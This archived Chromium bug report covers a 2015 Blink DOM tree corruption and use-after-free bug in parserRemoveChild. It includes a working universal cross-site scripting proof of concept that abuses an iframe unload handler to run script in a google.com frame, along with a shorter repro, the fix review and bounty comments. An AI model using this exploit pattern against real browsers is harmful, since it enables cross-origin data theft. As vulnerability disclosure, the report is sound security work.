# UAF/DOM tree corruption in blink::ContainerNode::parserRemoveChild

| Field | Value |
|-------|-------|
| **Issue ID** | [40082612](https://issues.chromium.org/issues/40082612) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>HTML, Blink>HTML>Parser |
| **Reporter** | se...@gmail.com |
| **Assignee** | ko...@chromium.org |
| **Created** | 2015-08-03 |
| **Bounty** | $7,500.00 |

## Description

UserAgent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36

Steps to reproduce the problem:
1. 
2. 
3. 

What is the expected behavior?

What went wrong?
It turns out the patch for https://crbug.com/chromium/456518 has introduced another issue.

third_party/WebKit/Source/core/dom/ContainerNode.cpp:618:
void ContainerNode::parserRemoveChild(Node& oldChild)
{
    ASSERT(oldChild.parentNode() == this);
    ASSERT(!oldChild.isDocumentFragment());

    Node* prev = oldChild.previousSibling();
    Node* next = oldChild.nextSibling();

    if (oldChild.connectedSubframeCount())
        ChildFrameDisconnector(oldChild).disconnect();

    ChildListMutationScope(*this).willRemoveChild(oldChild);
    oldChild.notifyMutationObserversNodeWillDetach();

    removeBetween(prev, next, oldChild);

    notifyNodeRemoved(oldChild);
    childrenChanged(ChildrenChange::forRemoval(oldChild, prev, next, ChildrenChangeSourceParser));
}

|ChildFrameDisconnector::disconnect| may trigger arbitrary JS execution via an
"unload" handler. The handler is able to make |prev| and |next| stale and reparent
|oldChild| so the DOM tree will be corrupted later in |removeBetween|.

The repro turns the DOM tree corruption into UXSS the same way as in https://crbug.com/chromium/456518.
<body>
<script>
helper = document.body.appendChild(document.createElement("iframe"));
container = document.createElement("div");

addEventListener("load", function() {
    magicFrame = document.querySelector("#frame");
    magicFrame.contentWindow.location = "https://www.google.com/intl/en/ads/?fg=1";
    magicFrame.onload = function() {
        magicFrame.onload = null;
        magicFrame.src = "javascript:alert(document.body.textContent)";

        helper.srcdoc = "<b><p>"
            + "<script type='foo'>p.appendChild(top.container);<\/script>"
            + "<script>p=document.querySelector('p');document.querySelector('script').type='';<\/script>"
            + "</b></p>";
    };
});
</script>
<div>
<b><p>
    <iframe id="frame" src="javascript:
        onunload = function() {
            if(top.el)
                return;
            top.el = frameElement.parentNode;
            top.container.appendChild(top.el);
        }"></iframe>
</b></p>
</div>
</body>

The short repro that demonstrates the tree inconsistency:
<body>
<b><p>
    <iframe id="frame" src="javascript:
        onunload = function() {
            if(!top.el)(top.el = document.createElement('a')).appendChild(frameElement.parentNode);     
        }"></iframe>
</b></p>
<script>
alert("el.firstChild.parentNode == el: " + (el.firstChild.parentNode == el));
</script>
</body>

Version:
Google Chrome 44.0.2403.125
Google Chrome 46.0.2471.0 canary

--

I would like to remain anonymous.

Did this work before? N/A 

Chrome version: 44.0.2403.125  Channel: stable
OS Version: 6.3
Flash Version: Shockwave Flash 18.0 r0

## Timeline

### mb...@chromium.org (2015-08-03)

[Empty comment from Monorail migration]

### mb...@chromium.org (2015-08-03)

[Empty comment from Monorail migration]

### mb...@chromium.org (2015-08-03)

[Empty comment from Monorail migration]

### cl...@chromium.org (2015-08-03)

[Empty comment from Monorail migration]

### ko...@chromium.org (2015-08-05)

[Empty comment from Monorail migration]

### ko...@chromium.org (2015-08-06)

Adding CL reviewers

### tk...@chromium.org (2015-08-06)

[Empty comment from Monorail migration]

### ko...@chromium.org (2015-08-06)

[Empty comment from Monorail migration]

### pe...@google.com (2015-08-06)

[Automated comment] No bugdroid (commit) comments found, couldn't auto-approve, needs manual review.

### am...@google.com (2015-08-06)

What change are we looking to merge?

### ko...@chromium.org (2015-08-06)

Sorry, somehow the bot is not catching up: https://codereview.chromium.org/1277793002/

### am...@google.com (2015-08-06)

Merge approved for M45 branch 2454.

### ko...@chromium.org (2015-08-07)

[Empty comment from Monorail migration]

### ko...@chromium.org (2015-08-07)

Should we go for stable merge???

### pe...@google.com (2015-08-07)

[Automated comment] No bugdroid (commit) comments found, couldn't auto-approve, needs manual review.

### pe...@chromium.org (2015-08-07)

Merge approved for m44 branch 2403.  Note that I don't know if or when there will be another refresh - but you can get it in just in case.

### ko...@chromium.org (2015-08-11)

[Empty comment from Monorail migration]

### ti...@google.com (2015-08-31)

Capturing with M45 release notes, even though it may have shipped earlier.

### ti...@google.com (2015-08-31)

Congrats - $7,500 for this report. You should have the cash in about 2-3 weeks.

### ti...@google.com (2015-09-04)

[Empty comment from Monorail migration]

### ti...@google.com (2015-09-10)

Processing via our e-payment system takes ~7 days, but the reward should be on its way to you. Thanks again for your help!

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### aw...@google.com (2019-02-16)

[Empty comment from Monorail migration]

### is...@google.com (2019-02-16)

This issue was migrated from crbug.com/chromium/516377?no_tracker_redirect=1

[Auto-CCs applied]
[Multiple monorail components: Blink>HTML, Blink>HTML>Parser]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40082612)*
